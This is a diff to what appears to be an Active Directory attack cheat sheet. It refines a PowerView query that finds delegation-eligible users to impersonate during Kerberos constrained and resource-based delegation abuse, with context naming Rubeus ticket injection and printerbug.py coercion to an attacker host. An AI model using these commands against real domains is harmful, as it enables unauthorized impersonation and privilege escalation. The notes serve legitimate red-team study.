@@ -913,7 +913,7 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 
 #### Check for user to impersonate
 ```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
 ```
 
 #### Rubeus request and inject TGT + TGS
@@ -1056,7 +1056,7 @@ Get-DomainComputer <SID>
 - Preferably a user that would be admin on the machine (Check BloodHound).
 - User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
 ```
 
 #### Impersonate another user (For example DA)
@@ -1170,7 +1170,7 @@ python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@8080/
 - Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
 - User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+Get-DomainUser | Where-Object {!($_.memberof -match "Protected Users")} | Where-Object {$_.useraccountcontrol -notmatch "NOT_DELEGATED"}
 ```
 
 #### Impersonate any user and exploit
